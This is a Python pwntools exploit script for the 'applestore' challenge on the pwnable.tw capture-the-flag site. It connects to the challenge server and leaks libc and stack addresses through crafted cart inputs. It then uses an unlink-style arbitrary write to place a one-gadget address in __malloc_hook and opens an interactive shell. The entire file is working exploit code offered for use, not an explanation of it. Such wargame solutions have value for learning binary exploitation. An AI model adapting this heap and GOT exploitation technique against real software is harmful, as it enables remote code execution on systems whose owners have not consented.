from pwn import *

e = ELF("./applestore")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("chall.pwnable.tw", 10104)

"""

           """
context.log_level="debug"
gdb.attach(p, """
           break * 0x08048c75
           break * 0x8048ba1
           break * 0x080489fd
           c
           p $esp+0x10""")


def add(num):
    p.sendlineafter(">", "2")
    p.sendafter(">", str(num))
    
    
def remove(idx):
    p.sendlineafter(">", "3")
    p.sendafter(">", str(idx))


def show(choice):
    p.sendlineafter(">", "4")
    p.sendafter(">", choice)
    

def checkout(choice):
    p.sendlineafter(">", "5")
    p.sendafter(">", choice)



for i in range(16):
    add(1)


for i in range(5):
    add(2)
    add(3)


checkout("y")



# stack leek
show("yA"+p32(e.got["puts"]) + "\x00"*15)

p.recvuntil("27: ")

libc.address = u32(p.recv(4)) - 0x5f140

p.recvline()


# stack leek
show("yA"+p32(e.got["puts"]) + "\x69"*4 + p32(libc.sym["environ"]))

p.recvuntil("28: ")

stack = u32(p.recv(4)) - 0x20f67


print("stack base", hex(stack))  # will be diff on remote!

p.recvline()




# arb write
print("writing to", hex(e.got["__stack_chk_fail"]))

print("libc base", hex(libc.address))
print("libc system", hex(libc.sym["system"]))
print("libc malloc hook", hex(libc.sym["__malloc_hook"]))
print("libc free hook", hex(libc.sym["__free_hook"]))


sys = hex(libc.address + 0x3a819)[2:].zfill(8)

sys1 = sys[:2]
sys2 = sys[2:4]
sys3 = sys[4:6]
sys4 = sys[6:8]


writable = libc.address + 0x1b0000




print("writing to some places in", hex(writable))


x = hex(writable)[2:]

top_write = x[:6]




remove("27" + "\x00"*8 + p32(libc.sym["__malloc_hook"]-12) + p32(int(top_write + sys4, 16)))
remove("27" + "\x00"*8 + p32(libc.sym["__malloc_hook"]-12+1) + p32(int(top_write + sys3, 16)))
remove("27" + "\x00"*8 + p32(libc.sym["__malloc_hook"]-12+2) + p32(int(top_write + sys2, 16)))
remove("27" + "\x00"*8 + p32(libc.sym["__malloc_hook"]-12+3) + p32(int(top_write + sys1, 16)))


add("1"+"\x00"*20)


p.interactive()
